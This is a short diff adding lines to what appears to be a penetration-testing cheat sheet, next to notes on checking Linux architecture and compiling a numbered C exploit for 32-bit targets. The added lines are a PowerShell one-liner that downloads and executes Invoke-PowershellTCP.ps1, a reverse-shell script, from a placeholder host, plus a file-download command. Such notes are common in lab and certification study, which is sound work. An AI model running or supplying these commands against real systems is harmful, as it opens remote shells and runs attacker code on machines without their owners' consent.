@@ -91,3 +91,6 @@ uname -m # Find linux architecture
 
 gcc -m32 1397.c -o 1398 -Wl,--hash-style=both #compile c file with 32 bit architecture with both the hash styles
 
+powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<>/Invoke-PowershellTCP.ps1')"
+Invoke-WebRequest -Uri http://<>/file -OutFile <filename>
+
